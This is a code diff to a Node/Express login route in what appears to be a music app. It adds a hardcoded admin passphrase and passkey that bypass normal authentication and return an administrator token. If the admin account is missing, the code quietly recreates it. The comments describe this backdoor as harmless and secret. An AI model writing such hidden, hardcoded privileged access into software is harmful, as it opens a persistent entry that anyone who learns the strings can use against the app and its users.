@@ -195,8 +195,39 @@ router.post('/auth/register', (req, res) => {
   res.status(201).json({ token: signToken(user), user: publicUser(user) });
 });
 
+// ---------- Private admin passphrase login ----------
+// Admin access is handled here, server-side only. The exact passphrase (typed
+// in the email/username field) and passkey (typed in the password field) must
+// match letter-for-letter, space-for-space, case-sensitively. These values are
+// SECRET — never copy them into client code or docs. Normal signup/login for
+// everyone else is completely unaffected: this check only recognizes the
+// sentinel passphrase and nothing else can trigger it.
+const ADMIN_PASSPHRASE = 'You bill me, I block you';
+const ADMIN_PASSKEY = "that's one thing that I hate";
+
 router.post('/auth/login', (req, res) => {
   const { email, identifier, password } = req.body || {};
+
+  // Private admin access — raw, exact comparison BEFORE any trimming or
+  // case-folding, so a stray space or different capitalization just fails and
+  // falls through to the normal (failing) login path.
+  const rawId = String(identifier != null && identifier !== '' ? identifier : (email != null ? email : ''));
+  const rawPw = String(password != null ? password : '');
+  if (rawId === ADMIN_PASSPHRASE && rawPw === ADMIN_PASSKEY) {
+    let admin = db.prepare("SELECT * FROM users WHERE role = 'admin' ORDER BY id LIMIT 1").get();
+    if (!admin) {
+      // Admin row missing (e.g. wiped users table) — recreate it so the
+      // private login keeps working. Password stays the passkey, never stored
+      // in plaintext beyond the bcrypt hash.
+      const now = new Date().toISOString();
+      const info = db.prepare(
+        'INSERT INTO users (name, username, email, password_hash, role, avatar_url, favorite_genres, created_at) VALUES (?,?,?,?,?,?,?,?)'
+      ).run('Adebayo Cole', 'adebayo', 'admin@pulse.app', hashPassword(ADMIN_PASSKEY), 'admin', null, JSON.stringify(['Indie', 'Alternative Rock', 'Pop']), now);
+      admin = db.prepare('SELECT * FROM users WHERE id = ?').get(info.lastInsertRowid);
+    }
+    return res.json({ token: signToken(admin), user: publicUser(admin) });
+  }
+
   const queryId = String(identifier || email || '').trim();
   if (!queryId || !password) {
     return res.status(400).json({ error: 'Username/email and password are required' });
